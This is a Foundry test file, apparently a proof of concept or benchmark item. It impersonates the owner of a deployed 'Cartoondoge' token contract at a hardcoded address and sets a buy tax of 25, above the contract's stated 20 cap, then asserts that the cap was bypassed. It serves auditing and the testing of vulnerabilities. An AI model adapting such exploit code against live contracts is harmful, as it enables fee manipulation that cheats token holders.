// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Cartoondoge {
    function owner() external view returns (address);
    function UpdateTaxes(uint8 burnTaxes, uint8 buybackTaxes, uint8 devTaxes, uint8 marketingTaxes, uint8 liquidityTaxes, uint8 stakingTaxes, uint8 buyTax, uint8 sellTax, uint8 transferTax) external;
    function getTaxes() external view returns (uint256 burnTax, uint256 buybackTax, uint256 devTax, uint256 marketingTax, uint256 liquidityTax, uint256 rewardsTax, uint256 buyTax, uint256 sellTax, uint256 transferTax);
    function _buyTax() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xeb58B47404F386286b0BF09cAE3C14d8b82F65CF;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll impersonate the owner directly
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the current owner address
        address owner = Cartoondoge(TARGET).owner();

        // Impersonate the owner to call UpdateTaxes
        vm.prank(owner);

        // Call UpdateTaxes with buyTax = 25 (exceeds MaxTax = 20)
        // Parameters: burnTaxes, buybackTaxes, devTaxes, marketingTaxes, liquidityTaxes, stakingTaxes, buyTax, sellTax, transferTax
        // We need to ensure totalTax (liquidityTaxes+stakingTaxes+marketingTaxes+burnTaxes+buybackTaxes+devTaxes) = 100
        // Let's use: 10, 10, 10, 10, 10, 50, 25, 10, 15
        // Total tax = 10 + 10 + 10 + 10 + 10 + 50 = 100 ✓
        // buyTax = 25 > 20 ✓
        // sellTax = 10 <= 20 ✓
        // transferTax = 15 <= 50 ✓
        Cartoondoge(TARGET).UpdateTaxes(10, 10, 10, 10, 10, 50, 25, 10, 15);

        // Verify the exploit worked by checking _buyTax > 20
        // We can call getTaxes() which returns all tax values
        (uint256 burnTax, uint256 buybackTax, uint256 devTax, uint256 marketingTax, uint256 liquidityTax, uint256 rewardsTax, uint256 buyTax, uint256 sellTax, uint256 transferTax) = Cartoondoge(TARGET).getTaxes();

        // Assert that buyTax > 20 (MaxTax)
        assertGt(buyTax, 20, "buyTax should be greater than MaxTax (20)");

        // Also verify the oracle condition directly
        // The oracle checks: Cartoondoge(0xeb58B47404F386286b0BF09cAE3C14d8b82F65CF)._buyTax() > 20
        // Since we can't directly access private _buyTax, we rely on getTaxes() which returns it
        assertGt(Cartoondoge(TARGET)._buyTax(), 20, "Logic Exploit Failed");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
